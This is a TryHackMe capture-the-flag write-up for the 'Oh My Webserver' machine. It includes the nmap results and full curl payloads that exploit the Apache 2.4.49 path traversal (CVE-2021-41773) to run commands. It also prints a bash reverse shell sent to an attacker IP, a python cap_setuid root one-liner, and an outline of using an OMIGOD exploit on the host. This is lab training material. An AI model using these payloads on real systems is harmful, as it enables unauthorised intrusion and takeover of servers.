# Oh My Webserver

---

Platform: Tryhackme

Difficulty: Medium

Initial Access: Outdated apache web server

Privilege Escalation: Misconfigured capabilities(container) and CVE-2021-38647(hostmachine)

---

Nmap scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/ohmywebserver]
└─$ sudo nmap -Pn -A -p- --min-rate 4000 10.10.25.254 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 00:34 EDT
Nmap scan report for 10.10.25.254
Host is up (0.27s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), Google Android 10.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:google:android:10 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Ports | Methodology |
| --- | --- |
| 22 (SSH) | Potentially for later use |
| 80 (http) | Apache service version 2.4.49 looks outdated. May be potential exploit availabe for this service version. |

---

### Getting User Flag

Port 80: 

Just a static website of business consultancy.

![image.png](image.png)

We can search for potential exploit which may be available on google for apache service version 2.4.49

![image.png](image%201.png)

Confirmed, this service version is vulnerable to CVE-2021-41773.

<aside>
💡

Apache 2.4.49 had a bug in how it normalized paths when processing HTTP requests.

This allowed attackers to **bypass access restrictions** and read files outside of the intended web root.
The `mod_cgi` or `mod_cgid` module must be enabled **if** you want to escalate to remote code execution.

</aside>

We can confirm `cgi-bin` directory though our browser.

![image.png](image%202.png)

Forbidden, means its present, but we can’t access it.

Through the understanding of above CVE, we can use this payload to check if it works.

```bash
┌──(ghost㉿kali)-[~/tryhackme/ohmywebserver]
└─$ curl 'http://10.10.92.95/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"
```

![image.png](image%203.png)

Ok, as it is executing our commands, let’s get the reverse shell back to us.

```bash
┌──(ghost㉿kali)-[~/tryhackme/ohmywebserver]
└─$ curl 'http://10.10.92.95/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami; bash; /bin/bash -i >& /dev/tcp/10.17.87.131/4445 0>&1' -H "Content-Type: text/plain"
```

![image.png](image%204.png)

Got the reverse shell back as user daemon, but it’s a container, not a host machine….

![image.png](image%205.png)

After a lot of enumeration, I found something interesting by exploring capabilities.

![image.png](image%206.png)

python3.7 binary is set for cap_setuid+ep capability, we can use it to gain root access.

> If you wanna read and know more about capabilities you can check [article by hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) on privilege escalation via capabilities.
> 

```bash
daemon@4a70924bafa0:/tmp$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![image.png](image%207.png)

Got root shell on that container.

Grabbed user flag.

![image.png](image%208.png)

---

### Getting Root flag

Checked container’s ip address

![image.png](image%209.png)

As this container is running on ip `172.17.0.2` , host machine should be running on `172.17.0.1` 

We can transfer [nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) on container and use it to scan open ports on hostmachine. 

Download that binary on your kali machine, then transfer it to the container which we owned.

![image.png](image%2010.png)

![image.png](image%2011.png)

Run that nmap binary.

![image.png](image%2012.png)

As we can see, 4 ports were open on hostmachine `22, 80, 5985, 5986`

While searching for potential service exploit for 5986, found out a POC for CVE-2021-38647 #OMIGOD.

![image.png](image%2013.png)

Downloaded that python exploit in to kali machine and served it to the container.

![image.png](image%2014.png)

![image.png](image%2015.png)

Run that exploit.

![image.png](image%2016.png)

And, successfully able to execute commands to the hostmachine.

Let’s grab root’s flag.

![image.png](image%2017.png)

---

That’s it for this machine.✅